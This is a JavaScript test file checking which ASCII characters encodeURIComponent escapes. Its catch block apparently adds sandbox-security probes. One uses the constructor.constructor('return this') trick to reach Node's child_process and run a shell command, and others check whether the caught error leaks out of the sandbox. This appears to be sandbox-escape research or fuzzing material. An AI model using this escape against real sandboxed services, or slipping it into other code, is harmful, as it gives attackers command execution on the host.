try {
    var uriUnescaped = [
        '-',
        '_',
        '.',
        '!',
        '~',
        '*',
        '\'',
        '(',
        ')',
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z',
        'a',
        'b',
        'c',
        'd',
        'e',
        'f',
        'g',
        'h',
        'i',
        'j',
        'k',
        'l',
        'm',
        'n',
        'o',
        'p',
        'q',
        'r',
        's',
        't',
        'u',
        'v',
        'w',
        'x',
        'y',
        'z',
        '0',
        '1',
        '2',
        '3',
        '4',
        '5',
        '6',
        '7',
        '8',
        '9'
    ];
    var errorCount = 0;
    var count = 0;
    var indexP;
    var indexO = 0;
    l:
        for (var index = 0; index <= 127; index++) {
            count++;
            var str = String.fromCharCode(index);
            for (var indexC = 0; indexC < uriUnescaped.length; indexC++) {
                if (uriUnescaped[indexC] === str)
                    continue l;
            }
            if (encodeURIComponent(str).toUpperCase() === decimalToPercentHexString(index))
                continue l;
            if (indexO === 0) {
                indexO = index;
            } else {
                if (index - indexP !== 1) {
                    if (indexP - indexO !== 0) {
                        var hexP = decimalToHexString(indexP);
                        var hexO = decimalToHexString(indexO);
                        $ERROR('#' + hexO + '-' + hexP + ' ');
                    } else {
                        var hexP = decimalToHexString(indexP);
                        $ERROR('#' + hexP + ' ');
                    }
                    indexO = index;
                }
            }
            indexP = index;
            errorCount++;
        }
    if (errorCount > 0) {
        if (indexP - indexO !== 0) {
            var hexP = decimalToHexString(indexP);
            var hexO = decimalToHexString(indexO);
            $ERROR('#' + hexO + '-' + hexP + ' ');
        } else {
            var hexP = decimalToHexString(indexP);
            $ERROR('#' + hexP + ' ');
        }
        $ERROR('Total error: ' + errorCount + ' bad Unicode character in ' + count + ' ');
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}